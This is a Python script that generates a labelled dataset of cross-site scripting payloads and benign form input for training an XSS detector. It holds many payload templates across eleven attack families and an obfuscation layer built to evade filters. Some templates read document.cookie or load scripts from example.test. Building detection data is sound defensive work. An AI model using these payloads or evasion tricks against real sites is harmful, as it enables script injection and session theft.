"""
generate_dataset.py
Builds a labelled dataset of XSS payloads (label=1) and normal web input (label=0).

Why synthetic?  Real attack corpora are scattered, inconsistently labelled and often
copyrighted.  A generator gives us (a) known ground-truth labels, (b) a 'family' tag for
every row so we can test on attack styles the model never saw in training, and
(c) full control over hard-negative (benign-but-suspicious-looking) samples.
All payloads only use harmless demo actions (alert/prompt/console.log, example.test URLs).
"""
import os, random, re, urllib.parse
import pandas as pd

random.seed(42)

# ---------------------------------------------------------------- ATTACK BUILDING BLOCKS
JS_BODIES = [
    "alert(1)", "alert('XSS')", 'alert("XSS")', "alert(document.domain)", "alert(document.cookie)",
    "prompt(1)", "confirm(1)", "console.log('xss')", "document.title='pwned'",
    "alert(String.fromCharCode(88,83,83))", "eval(atob('YWxlcnQoMSk='))",
    "window.location='http://example.test/'", "document.body.innerHTML='x'", "top.alert(1)",
]
BREAKOUTS = ["", "", "", '"><', "'><", "</textarea>", "</title>", '">', "'>", "-->"]
TAILS = ["", "", "", "//", "<!--", ">"]

def js():            return random.choice(JS_BODIES)
def ext_url():       return random.choice(["http://example.test/x.js", "//example.test/a.js", "https://example.test/p.js"])
def ev():            return random.choice(["onerror", "onload", "onmouseover", "onfocus", "onclick", "onmouseenter", "onpointerover"])

# family name -> function returning one raw payload
def f_script_tag():
    return random.choice([f"<script>{js()}</script>", f"<script src={ext_url()}></script>",
                          f"<script type=\"text/javascript\">{js()}</script>", f"<script>{js()}"])
def f_img_onerror():
    return random.choice([f"<img src=x onerror={js()}>", f"<img src=\"nope.png\" onerror=\"{js()}\">",
                          f"<img/src=x/onerror={js()}>", f"<img src=1 onerror='{js()}'>"])
def f_svg_onload():
    return random.choice([f"<svg onload={js()}>", f"<svg/onload={js()}>", f"<svg><script>{js()}</script></svg>",
                          f"<svg><animate onbegin={js()} attributeName=x dur=1s>"])
def f_iframe_js():
    return random.choice([f"<iframe src=\"javascript:{js()}\"></iframe>", f"<iframe src=javascript:{js()}>",
                          f"<iframe srcdoc=\"<script>{js()}</script>\"></iframe>"])
def f_anchor_js():
    return random.choice([f"<a href=\"javascript:{js()}\">click</a>", f"<a href=javascript:{js()}>go</a>",
                          f"<a href='jAvAsCrIpT:{js()}'>x</a>"])
def f_body_event():
    return random.choice([f"<body onload={js()}>", f"<body onpageshow={js()}>", f"<div onmouseover=\"{js()}\">hover</div>",
                          f"<marquee onstart={js()}>x</marquee>"])
def f_input_autofocus():
    return random.choice([f"<input autofocus onfocus={js()}>", f"<input onfocus=\"{js()}\" autofocus>",
                          f"<select autofocus onfocus={js()}>", f"<textarea autofocus onfocus={js()}>"])
def f_details_toggle():
    return random.choice([f"<details open ontoggle={js()}>", f"<details/open/ontoggle={js()}>",
                          f"<video><source onerror={js()}>", f"<audio src=x onerror={js()}>"])
def f_meta_data_uri():
    return random.choice([f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:{js()}\">",
                          "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
                          "<embed src=\"data:text/html,<script>alert(1)</script>\">",
                          f"<link rel=stylesheet href=\"javascript:{js()}\">"])
def f_attr_breakout():
    return random.choice([f"\" onmouseover=\"{js()}\" x=\"", f"' onfocus='{js()}' autofocus x='",
                          f"\"><script>{js()}</script>", f"';{js()};//", f"\";{js()};//"])
def f_dom_sink():
    return random.choice([f"#<img src=x onerror={js()}>", f"javascript:{js()}", f"data:text/html,<script>{js()}</script>",
                          f"<script>document.write('<img src=x onerror={js()}>')</script>"])

ATTACK_FAMILIES = {
    "script_tag": f_script_tag, "img_onerror": f_img_onerror, "svg_onload": f_svg_onload,
    "iframe_js": f_iframe_js, "anchor_js": f_anchor_js, "body_event": f_body_event,
    "input_autofocus": f_input_autofocus, "details_toggle": f_details_toggle,
    "meta_data_uri": f_meta_data_uri, "attr_breakout": f_attr_breakout, "dom_sink": f_dom_sink,
}

# ---------------------------------------------------------------- OBFUSCATION (evasion) LAYER
def rand_case(s):
    return "".join(c.upper() if random.random() < .5 else c.lower() for c in s)
def url_enc(s):
    return urllib.parse.quote(s, safe="") if random.random() < .7 else "".join(f"%{ord(c):02x}" if c in "<>\"'()/=" else c for c in s)
def html_ent(s):
    return "".join(f"&#x{ord(c):x};" if c in "<>\"'" and random.random() < .8 else c for c in s)
def uni_esc(s):
    return "".join(f"\\u{ord(c):04x}" if c in "<>" else c for c in s)
def ws_inject(s):
    return re.sub(r"(<\w+)\s", lambda m: m.group(1) + random.choice(["\t", "\n", "/", "  "]), s, count=1)
def comment_inject(s):
    return s.replace("script", "scr<!---->ipt", 1) if "script" in s and random.random() < .5 else s

MUTATIONS = {"none": lambda s: s, "case": rand_case, "url_encoded": url_enc, "html_entity": html_ent,
             "unicode_escape": uni_esc, "whitespace": ws_inject, "comment_split": comment_inject}
MUT_WEIGHTS = [0.40, 0.14, 0.14, 0.10, 0.06, 0.10, 0.06]

def make_attack():
    fam = random.choice(list(ATTACK_FAMILIES))
    raw = random.choice(BREAKOUTS) + ATTACK_FAMILIES[fam]() + random.choice(TAILS)
    mut = random.choices(list(MUTATIONS), weights=MUT_WEIGHTS)[0]
    return MUTATIONS[mut](raw), 1, fam, mut

# ---------------------------------------------------------------- BENIGN GENERATORS
NAMES = ["Aman", "Priya", "Rahul", "Sneha", "Vikram", "Neha", "Arjun", "Kavya", "Rohan", "Isha", "John Smith", "Maria Garcia", "O'Brien", "D'Souza"]
TOPICS = ["python tutorial", "weather in Delhi", "best laptop under 50000", "how to cook paneer", "machine learning roadmap",
          "cricket score today", "train timetable Ghaziabad", "learn cybersecurity", "resume tips for freshers", "javascript array methods",
          "css flexbox guide", "what is an api", "how does https work", "linux commands list", "sql join examples"]
PROSE = ["Great article, thanks for sharing!", "I loved this product, delivery was quick.", "Can you please update the report by Friday?",
         "The meeting is at 3 pm in room 204.", "Please alert the team about the server maintenance tonight.",
         "He wrote a script for the school play last year.", "Click the button below to continue.", "The onload time of our homepage is 2.1 seconds.",
         "Ignore the error message, it will go away after restart.", "My favourite function in Excel is VLOOKUP.",
         "We need to prompt users to confirm their email address.", "Cookies and cake were served at the party.",
         "Our team uses an iframe-free layout for accessibility.", "The image failed to load on my phone, please check.",
         "javascript is a popular programming language", "The document title should be shorter than 60 characters."]
HTML_OK = ["<b>important</b>", "<i>note</i>", "<p>Hello world</p>", "<ul><li>one</li><li>two</li></ul>", "<h1>Welcome</h1>",
           "<a href=\"https://example.com/docs\">Docs</a>", "<img src=\"photo.jpg\" alt=\"team photo\">", "<br>", "<div class=\"card\">Content</div>",
           "<span style=\"color:red\">warning</span>", "<table><tr><td>1</td></tr></table>", "<a href=\"mailto:help@example.com\">Email us</a>",
           "<button type=\"submit\">Save</button>", "<input type=\"text\" name=\"q\" placeholder=\"Search\">"]
MATH = ["if a < b and c > d then continue", "5 < 10 and 20 > 15", "x<y>z is a chain", "use the > symbol for quotes", "price < 500 & rating > 4"]
JSON_SNIPPETS = ['{"name": "Ravi", "age": 21}', '{"status": "ok", "items": [1, 2, 3]}', '{"query": "shoes", "page": 2}', '[{"id": 1}, {"id": 2}]']
SQLISH = ["SELECT name FROM students WHERE id = 5", "order by price desc", "john' and she said hello", "1 OR 2 is a valid expression"]
PATHS = ["C:\\Users\\Aman\\Documents\\report.docx", "/home/user/projects/app/main.py", "../images/logo.png", "https://example.com/products?id=42&sort=asc"]

def url_params():
    return random.choice(["https://shop.example.com/search?q=", "/results?query=", "/profile?user=", "/blog?id="]) + \
           urllib.parse.quote(random.choice(TOPICS + NAMES))
def email():
    return f"{random.choice(['aman','priya','rahul','neha'])}.{random.randint(1,99)}@{random.choice(['gmail.com','college.edu','mail.example'])}"
def encoded_benign():
    return urllib.parse.quote(random.choice(TOPICS + PROSE))   # %20 and friends but harmless

BENIGN_FAMILIES = {
    "search_query": lambda: random.choice(TOPICS), "person_name": lambda: random.choice(NAMES), "prose_hard_negative": lambda: random.choice(PROSE),
    "html_formatting": lambda: random.choice(HTML_OK), "math_symbols": lambda: random.choice(MATH), "json_data": lambda: random.choice(JSON_SNIPPETS),
    "sql_like": lambda: random.choice(SQLISH), "file_path_url": lambda: random.choice(PATHS), "url_with_params": url_params,
    "email_address": email, "encoded_benign": encoded_benign,
}

def decorate(text):
    """Wrap a benign string the way real form fields look (names, numbers, short context)."""
    r = random.random()
    if r < .25: return f"{random.choice(NAMES)}: {text}"
    if r < .45: return f"{text} {random.randint(1, 9999)}"
    if r < .60: return f"{text} - {random.choice(PROSE)}"
    if r < .70: return f"[{random.choice(['comment','review','title','bio','note'])}] {text}"
    return text

def make_benign():
    fam = random.choice(list(BENIGN_FAMILIES))
    return decorate(BENIGN_FAMILIES[fam]()), 0, fam, "none"

# ---------------------------------------------------------------- BUILD
def build(n_attack=3200, n_benign=4200):
    rows, seen = [], set()
    def add(row):
        if row[0] not in seen and row[0].strip():
            seen.add(row[0]); rows.append(row)
    tries = 0
    while sum(r[1] for r in rows) < n_attack and tries < 400000:
        add(make_attack()); tries += 1
    tries = 0
    while sum(1 - r[1] for r in rows) < n_benign and tries < 400000:
        add(make_benign()); tries += 1
    random.shuffle(rows)
    df = pd.DataFrame(rows, columns=["payload", "label", "family", "obfuscation"])
    df.insert(0, "id", range(1, len(df) + 1))
    df["label_name"] = df["label"].map({1: "xss_attack", 0: "benign"})
    df["length"] = df["payload"].str.len()
    return df

if __name__ == "__main__":
    os.makedirs("data", exist_ok=True)
    df = build()
    df.to_csv("data/xss_dataset.csv", index=False)
    print(df.shape); print(df.groupby(["label_name"]).size()); print(df.groupby("family").size())
